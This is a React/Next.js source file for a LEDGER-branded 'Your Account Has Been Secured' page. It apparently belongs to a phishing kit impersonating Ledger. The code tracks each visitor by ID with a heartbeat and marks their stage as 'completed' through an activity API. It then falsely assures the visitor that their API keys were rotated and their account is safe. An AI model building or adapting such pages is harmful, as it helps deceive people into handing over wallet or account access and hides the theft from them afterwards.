"use client"

import { useEffect, useState } from "react"
import { CheckCircle2 } from "lucide-react"
import type { UserActivity } from "@/lib/activity-store"
import { useHeartbeat } from "@/hooks/use-heartbeat"
import { LedgerFooter } from "@/components/ledger-footer"

export default function AccountSecuredPage() {
  const [visitorId, setVisitorId] = useState("")

  useHeartbeat(visitorId)

  useEffect(() => {
    const id = localStorage.getItem("visitorId")
    if (id) {
      setVisitorId(id)
      fetch(`/api/activity?visitorId=${id}`)
        .then((res) => res.json())
        .then((data) => {
          if (data.activity) {
            const activity: UserActivity = {
              ...data.activity,
              currentStage: "completed",
              lastUpdated: new Date().toISOString(),
            }
            fetch("/api/activity", {
              method: "POST",
              headers: { "Content-Type": "application/json" },
              body: JSON.stringify({ visitorId: id, activity }),
            })
          }
        })
    }
  }, [])

  return (
    <div className="min-h-screen bg-background flex flex-col">
      <header className="border-b border-border">
        <div className="max-w-6xl mx-auto px-4 sm:px-6 lg:px-8">
          <div className="flex items-center justify-between h-16">
            <div className="flex items-center">
              <div className="relative flex items-center">
                <span
                  className="absolute -top-0.5 -left-1 w-2.5 h-2.5 border-l-2 border-t-2 border-foreground"
                  aria-hidden="true"
                />
                <span className="font-bold text-foreground tracking-[0.2em] text-sm px-3 py-1">LEDGER</span>
                <span
                  className="absolute -bottom-0.5 -right-1 w-2.5 h-2.5 border-r-2 border-b-2 border-foreground"
                  aria-hidden="true"
                />
              </div>
            </div>
          </div>
        </div>
      </header>

      <main className="flex-1 flex items-center justify-center px-4">
        <div className="max-w-md mx-auto text-center">
          <div className="flex justify-center mb-6">
            <div className="w-20 h-20 rounded-full bg-success/20 flex items-center justify-center">
              <CheckCircle2 className="w-10 h-10 text-success" />
            </div>
          </div>

          <h1 className="text-2xl sm:text-3xl font-bold text-foreground mb-3">
            Your Account Has Been Secured
          </h1>

          <p className="text-sm sm:text-base text-muted-foreground mb-6 leading-relaxed">
            All security measures have been applied to your account. Your old API keys have been deactivated and your new keys are now active.
          </p>

          <p className="text-xs text-muted-foreground">
            Thanks for using Ledger.
          </p>
        </div>
      </main>

      <LedgerFooter />
    </div>
  )
}
